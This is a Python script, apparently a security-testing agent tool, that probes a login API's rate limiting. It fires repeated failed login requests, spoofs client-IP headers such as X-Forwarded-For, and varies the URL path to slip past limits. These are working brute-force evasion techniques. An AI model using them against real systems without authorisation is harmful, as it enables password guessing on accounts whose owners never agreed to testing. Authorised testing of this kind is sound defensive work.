#!/usr/bin/env python3
"""Detect and test API rate limiting bypass techniques.

Usage:
    python agent.py --url https://target.com/api/login --baseline
    python agent.py --url https://target.com/api/login --bypass-headers
    python agent.py --url https://target.com/api/login --path-variations
"""

import argparse
import json
import subprocess
from typing import Any


def test_baseline(url: str, max_requests: int = 200) -> dict[str, Any]:
    """Discover rate limit threshold with sequential requests."""
    results: list[dict[str, Any]] = []
    for i in range(1, max_requests + 1):
        cmd = [
            "curl",
            "-s",
            "-o",
            "/dev/null",
            "-w",
            "%{http_code}",
            "-X",
            "POST",
            url,
            "-H",
            "Content-Type: application/json",
            "-d",
            json.dumps({"email": "test@test.com", "password": f"wrong{i}"}),
        ]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            status = int(result.stdout.strip())
            results.append({"request": i, "status": status})
            if status == 429:
                return {
                    "status": "ok",
                    "test": "baseline",
                    "rate_limited_at": i,
                    "threshold": i - 1,
                }
        except (subprocess.TimeoutExpired, ValueError):
            results.append({"request": i, "error": "timeout"})
    return {
        "status": "ok",
        "test": "baseline",
        "rate_limited_at": None,
        "requests_sent": max_requests,
        "note": "No rate limit detected",
    }


def test_header_bypass(url: str) -> dict[str, Any]:
    """Test rate limit bypass using identity header rotation."""
    headers = [
        "X-Forwarded-For",
        "X-Real-IP",
        "X-Originating-IP",
        "X-Client-IP",
        "True-Client-IP",
        "CF-Connecting-IP",
    ]
    findings: list[dict[str, Any]] = []
    for header in headers:
        cmd = [
            "curl",
            "-s",
            "-o",
            "/dev/null",
            "-w",
            "%{http_code}",
            "-X",
            "POST",
            url,
            "-H",
            f"{header}: 127.0.0.1",
            "-H",
            "Content-Type: application/json",
            "-d",
            '{"email":"test@test.com","password":"test"}',
        ]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            status = int(result.stdout.strip())
            findings.append({"header": header, "status": status})
        except (subprocess.TimeoutExpired, ValueError):
            findings.append({"header": header, "error": "timeout"})
    return {"status": "ok", "test": "header_bypass", "findings": findings}


def test_path_variations(url: str) -> dict[str, Any]:
    """Test rate limit bypass using path normalization tricks."""
    from urllib.parse import urlparse

    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    path = parsed.path
    variations = [
        path,
        path + "/",
        path + "?",
        path.upper(),
        path.replace("/api/", "/api/./"),
        path + "%00",
        path + "#",
    ]
    findings: list[dict[str, Any]] = []
    for var_path in variations:
        cmd = [
            "curl",
            "-s",
            "-o",
            "/dev/null",
            "-w",
            "%{http_code}",
            "-X",
            "POST",
            f"{base}{var_path}",
            "-H",
            "Content-Type: application/json",
            "-d",
            '{"email":"test@test.com","password":"test"}',
        ]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            status = int(result.stdout.strip())
            findings.append({"path": var_path, "status": status})
        except (subprocess.TimeoutExpired, ValueError):
            findings.append({"path": var_path, "error": "timeout"})
    return {"status": "ok", "test": "path_variations", "findings": findings}


def main() -> None:
    parser = argparse.ArgumentParser(description="API rate limit bypass detector")
    parser.add_argument("--url", required=True, help="Target API endpoint")
    parser.add_argument(
        "--baseline", action="store_true", help="Test baseline rate limit"
    )
    parser.add_argument(
        "--bypass-headers", action="store_true", help="Test header bypass"
    )
    parser.add_argument(
        "--path-variations", action="store_true", help="Test path bypass"
    )
    parser.add_argument("--max-requests", type=int, default=200)
    parser.add_argument("--format", choices=["json", "text"], default="json")
    args = parser.parse_args()

    if args.baseline:
        result = test_baseline(args.url, args.max_requests)
    elif args.bypass_headers:
        result = test_header_bypass(args.url)
    elif args.path_variations:
        result = test_path_variations(args.url)
    else:
        parser.error("Use --baseline, --bypass-headers, or --path-variations")
        return

    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
